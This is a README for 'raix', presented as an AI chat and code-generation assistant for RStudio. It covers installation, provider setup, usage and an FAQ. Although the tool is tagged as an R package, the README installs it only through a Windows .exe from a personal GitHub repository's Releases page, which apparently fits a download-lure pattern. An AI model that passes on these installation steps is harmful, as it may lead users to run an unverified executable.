# 🤖 raix - Improve your R coding with AI

[![](https://img.shields.io/badge/Download-Raix_Installer-blue.svg)](https://github.com/joannlilywhite765/raix)

## About the software

Raix helps you write code in RStudio. It connects your editor to modern artificial intelligence models. You use it to chat, explain code, find errors, and generate new scripts. It works with many providers like OpenAI, Ollama, Claude, Groq, Mistral, and DeepSeek.

## 🛠️ System requirements

Your computer needs these items to run raix:

*   Windows 10 or 11
*   RStudio version 2023.06.0 or newer
*   The R programming language version 4.0 or newer
*   An active internet connection
*   At least 4GB of free memory

## 📥 Download and installation

Visit the [official download page](https://github.com/joannlilywhite765/raix) to get the installer. 

1. Go to the link above.
2. Find the section labeled Releases.
3. Click the file ending in .exe to start the download.
4. Open the downloaded file once it finishes.
5. Follow the prompts on your screen to complete the installation.
6. Restart RStudio after the installation finishes.

## 🚀 Connecting to AI models

Raix needs a connection to an AI provider to function. You have two ways to do this:

### Using cloud providers
If you want to use services like OpenAI or Claude, you need an API key. 

1. Sign up for an account on the website of your chosen provider.
2. Generate an API key in your account settings.
3. Open RStudio.
4. Locate the raix settings menu in the RStudio toolbar.
5. Paste your API key into the designated field.
6. Select your preferred model from the dropdown list.

### Using local models
If you want to run models on your own computer, you can use Ollama.

1. Download and install Ollama from their official website.
2. Open your computer terminal.
3. Type `ollama run llama3` and press Enter.
4. Wait for the model to download.
5. In RStudio, open the raix settings.
6. Select Ollama as your provider.
7. Enter the name of the model you downloaded.

## 💬 How to use raix

Once you install and configure the software, you see a new panel in RStudio. Click the raix icon to open the chat window.

### Chatting with code
Type questions into the chat box. Ask for help with data analysis, plot creation, or package installation. Raix replies directly in the chat panel.

### Generating code
Ask raix to write scripts for you. For example, type "Create a scatter plot using the iris dataset." Raix generates the code and provides a button to insert it into your current R script.

### Debugging errors
If your code fails, copy the error message and paste it into the raix chat window. Ask it to find the problem. Raix explains why the code failed and offers a fixed version.

### Explaining existing code
Highlight any block of code in your script. Right-click the selection and choose "Explain with raix." The chat panel displays a plain English summary of what the code does.

## ⚙️ Configuration options

You can adjust how raix works in the settings menu:

*   Model choice: Switch between different AI versions to balance speed and accuracy.
*   Temperature: Set this value to change how creative the AI responses are. Lower numbers make the AI more consistent.
*   Chat history: Choose whether to save your conversations or clear them automatically when you close RStudio.
*   Theme: Pick between light and dark modes to match your RStudio appearance.

## ❓ Frequently asked questions

### Does raix store my private data?
Your code and data stay on your computer or get sent only to the AI provider you select. Raix does not store your personal information.

### What if the AI gives a wrong answer?
AI models occasionally make mistakes. Always check the generated code before you run it. Verify complex statistical results against your data.

### Can I use multiple providers?
Yes. You can switch between providers in the settings menu at any time.

### Is there a cost?
Some providers require a subscription or a pay-per-use fee. Check the terms of your specific AI provider for details. Local models run through Ollama are free.

Keywords: ai, chatgpt, claude, coding-assistant, deepseek, developer-tools, generative-ai, hacktoberfest, llm, local-ai, ollama, openai, r, r-package, rstats, rstudio, small-llm